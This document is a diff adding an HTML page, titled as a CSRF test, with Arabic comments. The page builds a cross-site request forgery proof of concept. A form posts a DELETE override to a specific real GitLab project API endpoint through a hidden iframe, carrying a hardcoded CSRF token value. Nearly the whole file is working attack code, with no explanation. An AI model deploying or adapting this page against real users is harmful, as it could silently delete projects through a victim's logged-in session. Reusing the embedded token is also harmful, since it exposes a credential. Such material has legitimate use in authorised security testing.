@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Test with Custom Header</title>
+  </head>
+  <body>
+    <form
+      id="csrf-test-form"
+      action="https://gitlab.com/api/v4/projects/67138788"
+      method="POST"
+      target="hidden-iframe"
+    >
+      <!-- Add any other required hidden fields or parameters here -->
+      <input type="hidden" name="_method" value="DELETE" />
+      <button type="submit">Test CSRF</button>
+    </form>
+
+    <iframe
+      id="hidden-iframe"
+      name="hidden-iframe"
+      style="display: none"
+    ></iframe>
+
+    <script>
+      document
+        .getElementById("csrf-test-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          // إنشاء النموذج المؤقت داخل iframe
+          var iframe = document.getElementById("hidden-iframe");
+          var doc = iframe.contentWindow.document;
+          doc.open();
+          doc.write(
+            '<form id="temporary-form" action="' +
+              document.getElementById("csrf-test-form").action +
+              '" method="POST">'
+          );
+          doc.write('<input type="hidden" name="_method" value="DELETE">');
+          // إعداد الهيدر داخل النموذج
+          doc.write(
+            '<input type="hidden" name="X-Csrf-Token" value="evmOJ4aNqU-MZVbdwBq9ATbiwMFy-JwOktQwhAzM2TTcKQMJo2oxPL8KJT_cL1jLCrQrWiotXD3-Q34p96_D9Q">'
+          );
+          doc.write("</form>");
+          doc.close();
+
+          doc.getElementById("temporary-form").submit();
+        });
+    </script>
+  </body>
+</html>
